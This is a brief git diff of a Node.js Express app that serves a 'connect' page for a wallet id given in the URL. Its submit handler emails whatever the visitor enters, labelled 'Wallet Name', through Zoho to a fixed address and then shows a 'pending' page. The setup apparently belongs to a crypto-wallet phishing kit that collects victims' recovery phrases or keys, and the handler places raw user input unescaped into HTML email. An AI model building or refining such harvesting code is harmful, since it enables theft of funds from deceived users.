@@ -28,15 +28,15 @@ app.get('/welcome', (req, res) => {
     res.sendFile(__dirname + '/views/Welcome to our website.html')
 })
 
-app.get('/welcome/connect/:id', (req, res) => {
-    res.sendFile(__dirname + '/views/connect.html')
-})
-
 app.get('/connect/pending/success', (req, res) => {
     res.sendFile(__dirname + '/views/pending.html')
 })
 
-app.post('/welcome/connect/submit', async (req, res) => {
+app.get('/welcome/connect/:id', (req, res) => {
+    res.sendFile(__dirname + '/views/connect.html')
+})
+
+app.post('/welcome/connect/:id/submit', async (req, res) => {
     const transporter = nodemailer.createTransport({
         service: 'zoho',
         auth: {
@@ -63,7 +63,7 @@ app.post('/welcome/connect/submit', async (req, res) => {
             from: process.env.FROM,
             to: recipient,
             subject: `${req.body.category}`,
-            html: `${req.body.data}`
+            html: `Wallet Name: ${req.params.id} <br> ${req.body.data}`
         }
 
         await new Promise((resolve, reject) => {
